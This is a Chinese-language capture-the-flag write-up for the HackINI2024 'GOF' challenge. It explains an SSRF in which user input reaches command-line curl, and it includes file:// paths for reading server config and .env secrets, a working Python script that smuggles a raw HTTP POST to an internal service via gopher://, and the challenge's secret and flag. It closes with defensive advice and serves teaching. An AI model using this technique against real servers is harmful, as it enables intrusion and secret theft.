# HackINI2024 GOF

## 题目简述

主站把用户提交的 `service` 参数直接交给命令行 `curl`，因此不仅能请求 HTTP，还能使用 `file://` 读取本地文件、使用 `gopher://` 向内部服务发送原始协议数据。容器中有一个仅监听 `127.0.0.1:5000` 的 Flask 服务，只有收到正确 JSON secret 才执行 `/flag`。

## 解题过程

入口代码没有限制协议：

```python
def run_curl(url):
    result = subprocess.run(
        ["curl", url],
        capture_output=True,
        text=True,
        check=True,
        timeout=2,
    )
    return result.stdout
```

先利用 `file://` 枚举部署配置：

```text
file:///etc/apache2/sites-available/000-default.conf
file:///var/www/secret-service/app.py
file:///var/www/secret-service/.env
```

可以确认内部接口为 `POST /flag`，JSON 字段名是 `secret`，密钥为：

```text
b7bb70a3b3c95f570a8d31ece41bf7c5
```

请求体是 45 字节：

```json
{"secret":"b7bb70a3b3c95f570a8d31ece41bf7c5"}
```

把完整 HTTP 请求编码成 gopher selector：

```python
import requests
from urllib.parse import quote

target = "http://TARGET/request"
body = '{"secret":"b7bb70a3b3c95f570a8d31ece41bf7c5"}'
raw = (
    "POST /flag HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Type: application/json\r\n"
    f"Content-Length: {len(body.encode())}\r\n"
    "Connection: close\r\n"
    "\r\n"
    + body
)

gopher = "gopher://127.0.0.1:5000/_" + quote(raw, safe="")
response = requests.post(target, data={"service": gopher})
print(response.text)
```

`requests` 会在表单层再次编码 `%`，Flask 解码表单后，传给 curl 的仍是正确的单层 gopher URL。内部服务验证 secret 后执行根目录的 flag 程序，返回：

```text
shellmates{go_go_go_GoOOOPHER}
```

## 方法总结

SSRF 风险不只来自 HTTP。允许 curl 接收任意 URL 时，`file://` 可以泄露本地配置，`gopher://` 可以把任意字节流投递到仅本机可见的 TCP 服务。利用链应先读配置确定接口、密钥和请求格式，再精确构造 Content-Length 与换行。防御时应禁止非 HTTP(S) 协议、解析并校验最终地址，同时为内部服务保留独立且不可由文件读取获得的认证边界。
